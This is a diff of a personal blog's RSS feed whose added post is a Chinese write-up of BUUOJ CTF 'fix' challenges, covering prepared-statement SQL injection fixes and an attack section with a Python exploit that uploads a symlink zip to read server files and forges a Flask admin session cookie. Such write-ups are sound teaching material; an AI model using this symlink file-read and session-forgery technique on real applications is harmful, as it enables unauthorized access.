@@ -1,4 +1,99 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>AmiaaaZ's Site</title><link>https://amiaaaz.github.io/</link><description>Recent content on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 07 Nov 2021 14:39:15 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>KillerQueenCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/11/07/killerqueenctf2021-wp/</link><pubDate>Sun, 07 Nov 2021 14:39:15 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/07/killerqueenctf2021-wp/</guid><description>&lt;h2 id="webjust-not-my-type">web/Just Not My Type&lt;/h2>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>AmiaaaZ's Site</title><link>https://amiaaaz.github.io/</link><description>Recent content on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 07 Nov 2021 08:57:29 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>buuoj加固题 Wp</title><link>https://amiaaaz.github.io/2021/11/07/buuoj-fixchalls-wp/</link><pubDate>Sun, 07 Nov 2021 08:57:29 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/07/buuoj-fixchalls-wp/</guid><description>&lt;p>buuoj新上了加固题这个分类，也就是线下awdp中fix的部分，只要将靶机中存在的漏洞修复好并通过check的检测即可拿到flag；有一说一，比单纯attack拿flag会简单很多（适合我这种沸物web&lt;/p>
+&lt;p>下面的wp会先说纯修复角度，再串一下整体的知识点；因为自己水平有限，想尽可能说的清楚一些就会比较啰嗦，见谅QAQ&lt;/p>
+&lt;h2 id="ezsql">Ezsql&lt;/h2>
+&lt;h3 id="fix">FIX&lt;/h3>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107083450780.png" alt="image-20211107083450780">&lt;/p>
+&lt;p>200行，太典了，对传入的参数完全没有检测，是个筛子；用预处理的方式修，又可以分为两种形式&lt;/p>
+&lt;h3 id="mysql预处理">mysql预处理&lt;/h3>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107083655664.png" alt="image-20211107083655664">&lt;/p>
+&lt;p>其中201行的&lt;code>ss&lt;/code>指的是绑定SQL参数的类型为string，这一项必不可少而且必须与后面的参数一一对应&lt;/p>
+&lt;h3 id="pdo预处理">PDO预处理&lt;/h3>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107084309239.png" alt="image-20211107084309239">&lt;/p>
+&lt;p>PDO预处理属于是通防了，能有效地应对sqli特别是堆叠注入，208行的设置项意为禁用模拟预处理&lt;/p>
+&lt;h2 id="ciscn2021-总决赛babypython">[CISCN2021 总决赛]babypython&lt;/h2>
+&lt;h3 id="fix-1">FIX&lt;/h3>
+&lt;p>ssh连上后看下目录结构&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212456961.png" alt="image-20211106212456961">&lt;/p>
+&lt;p>查看/app/y0u_found_it/y0u_found_it_main.py&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212556547.png" alt="image-20211106212556547">&lt;/p>
+&lt;p>11行这不是典中典了？读mac地址就打通了，所以我们直接把SECRET_KEY改为一个又长又乱的随机字符串即可，可以使用&lt;a href="uuid/guid%E7%94%9F%E6%88%90%E5%99%A8">uuid/guid生成器&lt;/a>来生成&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106210732859.png" alt="image-20211106210732859">&lt;/p>
+&lt;blockquote>
+&lt;p>————碎碎念：这里修复的时候可能看脸？我在几天前试的时候用的一模一样的方法，但是怎么都不能过check，今天试了一次就可以了，但是在写wp的时候再复盘就又不可以了……emmm 可能还是哪里的细节出了错但是我没有注意到？给我整不会了属于是&lt;/p>
+&lt;/blockquote>
+&lt;h3 id="关于本题">关于本题&lt;/h3>
+&lt;p>是个原题，还是个有了包浆的原题，参见-&amp;gt;&lt;strong>&lt;a href="https://buuoj.cn/challenges#%5BHCTF%202018%5DHideandseek">[HCTF 2018]Hideandseek&lt;/a>&lt;/strong> | &lt;strong>&lt;a href="https://buuoj.cn/challenges#%5BSWPU2019%5DWeb3">[SWPU2019]Web3&lt;/a>&lt;/strong>，做过的就知道这他妈真的就一模一样hhhhhhhh&lt;/p>
+&lt;p>考点在于linux软链接+uuid+flask-session伪造，后者还经常单独出题，比如 &lt;strong>&lt;a href="https://buuoj.cn/challenges#%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb4">[CISCN2019 华东南赛区]Web4&lt;/a>&lt;/strong>，都快烤烂了&lt;/p>
+&lt;h3 id="考点一--uuidsecret_key">考点一 · uuid&amp;amp;SECRET_KEY&lt;/h3>
+&lt;p>SECRET_KEY通过uuid+伪随机数的方式生成，这个考点可以参考 &lt;strong>&lt;a href="https://buuoj.cn/challenges#%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb4">[CISCN2019 华东南赛区]Web4&lt;/a>&lt;/strong>，其中app.py是这样写的&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212834438.png" alt="image-20211106212834438">&lt;/p>
+&lt;p>&lt;code>uuid.getnode()&lt;/code>会以48位二进制长度的正整数形式返回mac地址，linux下mac地址的位置在&lt;code>/sys/class/net/eth0/address&lt;/code>，读出mac地址后我们也来生成一波伪随机数&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210707204313712.png" alt="image-20210707204313712">&lt;/p>
+&lt;p>之后通过flask-session-cookie-manager一把梭即可伪造session值&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210707204240633.png" alt="image-20210707204240633">&lt;/p>
+&lt;p>————另外，通常访问不存在目录时SECRET_KEY会出现在请求头中&lt;/p>
+&lt;h3 id="考点二--linux软链接文件读取zip压缩包">考点二 · linux软链接文件读取&amp;amp;zip压缩包&lt;/h3>
+&lt;p>ln -s是linux中的软链接命令，我们可以制作对应文件的绝对路径的软链接来读文件；当不知道flask工作目录可以使用&lt;code>/proc/self/cwd&lt;/code>来指向当前进程的目录&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ln -s /proc/self/cwd/flag/flag/.jpg qwe
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>或者通过&lt;code>/proc/self/environ&lt;/code>文件里包含进程的环境变量，可以从中获取flask的绝对路径，再制作软链接（关于/proc的更多信息可以参见-&amp;gt;&lt;a href="https://amiaaaz.github.io/proc%E7%9B%AE%E5%BD%95%E7%9A%84%E5%A6%99%E7%94%A8">/proc目录的妙用&lt;/a> | &lt;a href="https://bbs.zkaq.cn/t/3639.html">LFItoRCE利用总结&lt;/a>，题-&amp;gt;[网鼎杯 2020 白虎组]PicDown&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ln -s /proc/self/environ qwe
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>而对于目录内文件的列举也是有方法的（参考-&amp;gt;&lt;a href="https://blog.csdn.net/keyball123/article/details/105169946">34C3 CTF Web题 extract0r Writeup&lt;/a>&lt;/p>
+&lt;p>制作好的软链接通过zip打包&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">zip -ry qwe.zip qwe
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>更多题目中的应用可以参见-&amp;gt;&lt;a href="http://redteam.today/2018/01/20/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%9A%E7%A7%8D%E8%A7%A3%E6%B3%95/">记录一道题的多种解法&lt;/a>&lt;/p>
+&lt;p>关于这个漏洞的实际应用可以参见-&amp;gt;&lt;a href="https://paper.seebug.org/104/">GitLab 任意文件读取漏洞 (CVE-2016-9086) 和任意用户 token 泄露漏洞&lt;/a>&lt;/p>
+&lt;h3 id="attack">*ATTACK&lt;/h3>
+&lt;p>exp.py - 1 生成软链接&amp;amp;zip&amp;amp;自动上传&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
+&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
+&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
+&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://0a716e50-1cf2-4cd8-a00f-b70d9987ed64.node3.buuoj.cn/upload&amp;#39;&lt;/span>
+&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">makezip&lt;/span>&lt;span style="color:#111">():&lt;/span>
+&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ln -s &amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39; exp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#75715e"># os.system(&amp;#39;zip --symlinks exp.zip exp&amp;#39;)&lt;/span>
+&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;zip -ry exp.zip exp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">makezip&lt;/span>&lt;span style="color:#111">()&lt;/span>
+&lt;span style="color:#111">files&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;the_file&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;./exp.zip&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;rb&amp;#39;&lt;/span>&lt;span style="color:#111">)}&lt;/span>
+&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">exploit&lt;/span>&lt;span style="color:#111">():&lt;/span>
+&lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">files&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">files&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">res&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">()&lt;/span>
+&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;rm -rf exp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;rm -rf exp.zip&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python3 /proc/self/environ
+python3 exp.py /app/y0u_found_it.ini
+python3 /app/y0u_found_it/y0u_found_it_main.py
+python3 /sys/class/net/eth0/address
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106234837193.png" alt="image-20211106234837193">&lt;/p>
+&lt;p>exp.py - 2 根据mac地址生成伪随机数&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">uuid&lt;/span>
+&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
+&lt;span style="color:#111">mac&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;02:42:0a:00:cb:06&amp;#34;&lt;/span>
+&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">mac&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;:&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">]&lt;/span>
+&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">bin&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;0b&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">zfill&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">]&lt;/span>
+&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">mac&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">mac&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">100&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#75715e"># 36.014406163923596&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python3 flask_session_cookie_manager3.py decode -c &lt;span style="color:#d88200">&amp;#39;eyJ1c2VybmFtZSI6Imd1ZXN0In0.FGg0EA.rHjESo_p6RCP0eiosSFmF3xEmRc&amp;#39;&lt;/span>
+python3 flask_session_cookie_manager3.py encode -s &lt;span style="color:#d88200">&amp;#39;36.014406163923596&amp;#39;&lt;/span> -t &lt;span style="color:#d88200">&amp;#34;{u&amp;#39;username&amp;#39;: u&amp;#39;admin&amp;#39;}&amp;#34;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106235751916.png" alt="image-20211106235751916">&lt;/p>
+&lt;p>翻回头看源码，好家伙这里有内鬼&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106235832895.png" alt="image-20211106235832895">&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107075450043.png" alt="image-20211107075450043">&lt;/p>
+&lt;p>返回的并不是真正的flag，而是secret.secret中的内容no flah&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107075326929.png" alt="image-20211107075326929">&lt;/p>
+&lt;p>67行这里会对unzip打开的文件进行检查，只要含有flag字样就会重定向至/?error=1&lt;/p>
+&lt;p>————这里我感觉原题应该secret.py中的&lt;code>secret=&lt;/code>直接就能读出来flag，想了好久，再绕一层flag.txt的话我是想不出来什么bypass的方法了，我倾向于是布置环境的时候没有设置这一点（&lt;/p>
+&lt;h2 id="ciscn2021-总决赛easy_python">***[CISCN2021 总决赛]easy_python&lt;/h2>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212057524.png" alt="image-20211106212057524">&lt;/p>
+&lt;p>不知道是我的网络问题还是什么未知的bug……check之后就会宕机，只能重新下发靶机&lt;/p>
+&lt;h2 id="ciscn2021-总决赛ezj4va">***[CISCN2021 总决赛]ezj4va&lt;/h2>
+&lt;p>&lt;a href="https://juejin.cn/post/6997314123918737422">https://juejin.cn/post/6997314123918737422&lt;/a>&lt;/p>
+&lt;p>还不会java 先空着TAT&lt;/p></description></item><item><title>KillerQueenCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/10/30/killerqueenctf2021-wp/</link><pubDate>Sat, 30 Oct 2021 16:39:15 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/30/killerqueenctf2021-wp/</guid><description>&lt;h2 id="webjust-not-my-type">web/Just Not My Type&lt;/h2>
 &lt;blockquote>
 &lt;p>I really don&amp;rsquo;t think we&amp;rsquo;re compatible (&lt;a href="http://143.198.184.186:7000/">Link&lt;/a>)&lt;/p>
 &lt;/blockquote>
@@ -88,102 +183,7 @@
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211030120130169.png" alt="image-20211030120130169">&lt;/p>
 &lt;p>33a465747cb15e84a26564f57cda0988&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107144316344.png" alt="image-20211107144316344">&lt;/p>
-&lt;p>&lt;code>flag{dancingqueen}&lt;/code>&lt;/p></description></item><item><title>buuoj加固题 Wp</title><link>https://amiaaaz.github.io/2021/11/07/buuoj-fixchalls-wp/</link><pubDate>Sun, 07 Nov 2021 08:57:29 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/07/buuoj-fixchalls-wp/</guid><description>&lt;p>buuoj新上了加固题这个分类，也就是线下awdp中fix的部分，只要将靶机中存在的漏洞修复好并通过check的检测即可拿到flag；有一说一，比单纯attack拿flag会简单很多（适合我这种沸物web&lt;/p>
-&lt;p>下面的wp会先说纯修复角度，再串一下整体的知识点；因为自己水平有限，想尽可能说的清楚一些就会比较啰嗦，见谅QAQ&lt;/p>
-&lt;h2 id="ezsql">Ezsql&lt;/h2>
-&lt;h3 id="fix">FIX&lt;/h3>
-&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107083450780.png" alt="image-20211107083450780">&lt;/p>
-&lt;p>200行，太典了，对传入的参数完全没有检测，是个筛子；用预处理的方式修，又可以分为两种形式&lt;/p>
-&lt;h3 id="mysql预处理">mysql预处理&lt;/h3>
-&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107083655664.png" alt="image-20211107083655664">&lt;/p>
-&lt;p>其中201行的&lt;code>ss&lt;/code>指的是绑定SQL参数的类型为string，这一项必不可少而且必须与后面的参数一一对应&lt;/p>
-&lt;h3 id="pdo预处理">PDO预处理&lt;/h3>
-&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107084309239.png" alt="image-20211107084309239">&lt;/p>
-&lt;p>PDO预处理属于是通防了，能有效地应对sqli特别是堆叠注入，208行的设置项意为禁用模拟预处理&lt;/p>
-&lt;h2 id="ciscn2021-总赛babypython">[CISCN2021 总赛]babypython&lt;/h2>
-&lt;h3 id="fix-1">FIX&lt;/h3>
-&lt;p>ssh连上后看下目录结构&lt;/p>
-&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212456961.png" alt="image-20211106212456961">&lt;/p>
-&lt;p>查看/app/y0u_found_it/y0u_found_it_main.py&lt;/p>
-&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212556547.png" alt="image-20211106212556547">&lt;/p>
-&lt;p>11行这不是典中典了？读mac地址就打通了，所以我们直接把SECRET_KEY改为一个又长又乱的随机字符串即可，可以使用&lt;a href="uuid/guid%E7%94%9F%E6%88%90%E5%99%A8">uuid/guid生成器&lt;/a>来生成&lt;/p>
-&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106210732859.png" alt="image-20211106210732859">&lt;/p>
-&lt;blockquote>
-&lt;p>————碎碎念：这里修复的时候可能看脸？我在几天前试的时候用的一模一样的方法，但是怎么都不能过check，今天试了一次就可以了，但是在写wp的时候再复盘就又不可以了……emmm 可能还是哪里的细节出了错但是我没有注意到？给我整不会了属于是&lt;/p>
-&lt;/blockquote>
-&lt;h3 id="关于本题">关于本题&lt;/h3>
-&lt;p>是个原题，还是个有了包浆的原题，参见**&lt;a href="https://buuoj.cn/challenges#%5BHCTF%202018%5DHideandseek">[HCTF 2018]Hideandseek&lt;/a>** | &lt;strong>&lt;a href="https://buuoj.cn/challenges#%5BSWPU2019%5DWeb3">[SWPU2019]Web3&lt;/a>&lt;/strong>，做过的就知道这他妈真的就一模一样hhhhhhhh&lt;/p>
-&lt;p>考点在于linux软链接+uuid+flask-session伪造，后者还经常单独出题，比如**&lt;a href="https://buuoj.cn/challenges#%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb4">[CISCN2019 华东南赛区]Web4&lt;/a>**，都快烤烂了&lt;/p>
-&lt;h3 id="考点一--uuidsecret_key">考点一 · uuid&amp;amp;SECRET_KEY&lt;/h3>
-&lt;p>SECRET_KEY通过uuid+伪随机数的方式生成，这个考点可以参考，其中app.py是这样写的&lt;/p>
-&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212834438.png" alt="image-20211106212834438">&lt;/p>
-&lt;p>&lt;code>uuid.getnode()&lt;/code>会以48位二进制长度的正整数形式返回mac地址，linux下mac地址的位置在&lt;code>/sys/class/net/eth0/address&lt;/code>，读出mac地址后我们也来生成一波伪随机数&lt;/p>
-&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210707204313712.png" alt="image-20210707204313712">&lt;/p>
-&lt;p>之后通过flask-session-cookie-manager一把梭即可伪造session值&lt;/p>
-&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210707204240633.png" alt="image-20210707204240633">&lt;/p>
-&lt;p>————另外，通常访问不存在目录时SECRET_KEY会出现在请求头中&lt;/p>
-&lt;h3 id="考点二--linux软链接文件读取zip压缩包">考点二 · linux软链接文件读取&amp;amp;zip压缩包&lt;/h3>
-&lt;p>ln -s是linux中的软链接命令，我们可以制作对应文件的绝对路径的软链接来读文件；当不知道flask工作目录可以使用&lt;code>/proc/self/cwd&lt;/code>来指向当前进程的目录&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ln -s /proc/self/cwd/flag/flag/.jpg qwe
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>或者通过&lt;code>/proc/self/environ&lt;/code>文件里包含进程的环境变量，可以从中获取flask的绝对路径，再制作软链接（关于/proc的更多信息可以参见-&amp;gt;&lt;a href="https://amiaaaz.github.io/proc%E7%9B%AE%E5%BD%95%E7%9A%84%E5%A6%99%E7%94%A8">/proc目录的妙用&lt;/a> | &lt;a href="https://bbs.zkaq.cn/t/3639.html">LFItoRCE利用总结&lt;/a>，题-&amp;gt;[网鼎杯 2020 白虎组]PicDown&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ln -s /proc/self/environ qwe
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>而对于目录内文件的列举也是有方法的（参考-&amp;gt;&lt;a href="https://blog.csdn.net/keyball123/article/details/105169946">34C3 CTF Web题 extract0r Writeup&lt;/a>&lt;/p>
-&lt;p>制作好的软链接通过zip打包&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">zip -ry qwe.zip qwe
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>更多题目中的应用可以参见-&amp;gt;&lt;a href="http://redteam.today/2018/01/20/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%9A%E7%A7%8D%E8%A7%A3%E6%B3%95/">记录一道题的多种解法&lt;/a>&lt;/p>
-&lt;p>关于这个漏洞的实际应用可以参见-&amp;gt;&lt;a href="https://paper.seebug.org/104/">GitLab 任意文件读取漏洞 (CVE-2016-9086) 和任意用户 token 泄露漏洞&lt;/a>&lt;/p>
-&lt;h3 id="attack">*ATTACK&lt;/h3>
-&lt;p>exp.py - 1 生成软链接&amp;amp;zip&amp;amp;自动上传&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
-&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
